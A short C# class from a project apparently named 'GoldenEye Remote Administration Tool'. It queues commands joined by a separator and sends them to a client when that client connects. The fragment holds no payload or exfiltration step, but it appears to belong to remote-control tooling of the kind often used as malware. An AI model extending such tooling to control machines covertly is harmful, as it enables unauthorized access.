namespace GoldenEye_Remote_Administration_Tool.Functions
{
    public class OnJoinCommandsHandler
    {
        public Connection clientus;
        private string alltoSend = "onJoin|";

        public void addToSend(string cmd)
        {
            alltoSend += cmd + "³";
        }

        public void sendCommand()
        {
            clientus.Send(alltoSend);
        }
    }
}